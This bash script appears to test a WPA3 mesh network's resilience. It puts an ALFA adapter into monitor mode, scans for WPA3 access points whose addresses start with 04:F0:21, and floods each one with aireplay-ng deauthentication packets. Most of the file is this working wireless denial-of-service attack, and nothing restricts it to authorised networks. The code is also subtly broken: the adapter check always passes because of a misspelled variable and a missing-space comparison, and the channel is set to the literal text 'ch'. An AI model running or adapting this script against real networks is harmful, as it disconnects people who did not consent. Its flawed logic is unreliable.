#!/bin/bash

_init() {

    # The functions verifies if the device is an ALFA capable of monitor mode. 
	# Upon verfication it then puts the device into monitor mode to carry out atttacks	
  
    echo "Init called"
	
	# Check if it is an ALFA device
	# Checks if it is an ALFA device by comparing the OUI reference

	addr=$(iw $interface info | grep addr | awk '{print $2}')
	if [ ${add:0:8}=="00:c0:ca" ]; then
		echo "Given Interface has a ALFA device, we can proced"
	else
		echo "Given Interface is not a ALFA device, check your connection"
		exit 1
	fi
	
	# Check if Monitor mode is already enabled, If not enable Monitor mode

	_init_result
	
	if [ "$result" -eq "1" ]; then
	
		echo "Device already in monitor mode"
	
	else
		airmon-ng check kill
		airmon-ng start $interface
	fi
	
	# Check with Monitor mode initialization was sucessfull

	_init_result
	
	if [ "$result" -eq "1" ]; then
		echo "Device sucessfully in monitor mode"
	else
		echo "Unable to put in monitor mode, Disconnect and reconnect your device"
		exit 1
	fi
		
}

_init_result() {

	# Checks if the interface is in Monitor mode or now

	mode=$(iwconfig $interface | grep Mode | awk '{print $1}' | cut -d ":" -f2-)

	if [ $mode == "Monitor" ]; then
		result=1
	else
		result=0
	fi


}

_deinit() {

	# Take the interface out of monitor mode

	airmon-ng stop $interface

}

_result() {

	echo "Manual Checking to be done: By monitoring the batctl neighbours in the devices in the mesh network"

	# The result method to be improved by analyzing  captured libcap file via second dongle in monitor mode

}

_test(){

	channel=0

	bssid_list=()

	# Scan the area for WPA3 networks

	airodump=$(airodump-ng "$interface" -b a| grep WPA3 | head -n 100)

	# Make a list of devices that would in the interested mesh comm

	while IFS= read -r line; do  

		words=( $line )
		mac=${words[0]}
		ch=${words[5]}
		
		[[ ${bssid_list[@]} =~ (^|[[:space:]])"$mac"($|[[:space:]]) ]] && result=1 || result=0 
		
		
		if   [ "${mac:0:8}" == "04:F0:21" ] && [ "$result" == 0 ]
			then
			
			bssid_list+=( "$mac" )
			channel=ch
			
		fi

	done <<< "$airodump"

	echo "List of the devices to be attacked"
	echo "${bssid_list[@]}"

	# Set the channel for sending attack packets

	echo "Launching airodump-ng on another terminal to set the channel"
	echo $channel
	xterm -e airodump-ng --channel "$channel" $interface & 

	# Loop and send Deauth packets to every device in list of targeted devices

	for value in ${bssid_list[@]};
	do	
		echo "Attacking device " $value " now "
		aireplay-ng -0 10 -a $value $interface 

	done

}

## Init , test and deinit are called.

main(){

	_init

	_test

	_deinit

	_result

}

main "$@"
